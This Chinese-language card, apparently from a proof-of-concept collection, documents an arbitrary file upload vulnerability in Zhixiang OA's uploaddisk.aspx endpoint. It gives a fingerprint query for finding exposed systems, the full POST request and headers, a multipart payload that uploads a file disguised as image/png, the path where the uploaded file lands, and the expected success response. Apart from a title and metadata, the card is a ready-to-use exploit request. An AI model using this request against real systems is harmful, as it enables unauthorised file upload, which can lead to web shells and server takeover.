# 致翔OAuploaddisk存在任意文件上传漏洞

- **系统**：致翔　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="obj.src ="`
- **请求**：`POST /DocManage/WorkFlow/uploaddisk.aspx HTTP/1.1`
- **关键头**：`Content-Length: 197`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryElfcTfs4…`

**请求体 / payload**
```
------WebKitFormBoundaryElfcTfs456aUZQAZ
Content-Disposition: form-data; name="EDITFILE"; filename="em0zmh73ul.txt"
Content-Type: image/png
123456
------WebKitFormBoundaryElfcTfs456aUZQAZ--
上传定位：
/em0zmh73ul.txt
```
- **预期**：200　|　—